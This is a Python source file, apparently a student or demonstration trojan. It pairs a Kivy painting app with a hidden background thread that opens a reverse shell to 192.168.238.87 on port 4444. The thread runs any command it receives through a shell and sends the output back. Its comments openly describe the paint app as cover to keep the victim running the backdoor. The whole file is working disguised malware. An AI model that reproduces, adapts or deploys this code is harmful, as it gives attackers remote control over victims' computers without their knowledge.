from random import random
from kivy.app import App
from kivy.uix.widget import Widget
from kivy.uix.button import Button
from kivy.graphics import Color, Ellipse, Line

import threading
import socket
import subprocess


def main():
    #specify target ip of backdoor connection
    #and the port it will run on
    server_ip = '192.168.238.87'
    port = 4444
    
    #create backdoor connection
    backdoor = socket.socket()
    backdoor.connect((server_ip, port))

    #inifinite loop to execute hackers commands while program is up
    while True:
        #recieves commands
        command = backdoor.recv(1024)
        command = command.decode()

        #executes command on victim's machine
        op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)

        #retrieves output and sends back to hacker's machine
        output = op.stdout.read()
        output_error = op.stderr.read()
        backdoor.send(output + output_error)


#innocent paintesque application to keep user entertained and using the trojan
class MyPaintWidget(Widget):

    #creates dot with random color on mouse click
    def on_touch_down(self, touch):
        color = (random(), 1, 1)
        with self.canvas:
            Color(*color, mode='hsv')
            d = 30.
            Ellipse(pos=(touch.x - d / 2, touch.y - d / 2), size=(d, d))
            touch.ud['line'] = Line(points=(touch.x, touch.y))

    #creates line with same color when mouse click is dragged
    def on_touch_move(self, touch):
        touch.ud['line'].points += [touch.x, touch.y]

#builds the app space and implements functionality of widget
class App(App):
    def build(self):
        parent = Widget()
        self.painter = MyPaintWidget()
        clearbtn = Button(text='Clear')
        clearbtn.bind(on_release=self.clear_canvas)
        parent.add_widget(self.painter)
        parent.add_widget(clearbtn)
        return parent

    #clear button to restart drawing
    def clear_canvas(self, obj):
        self.painter.canvas.clear()


#runs main function simultaneously with app
mal_thread = threading.Thread(target=main)
mal_thread.start()


app = App()
app.run()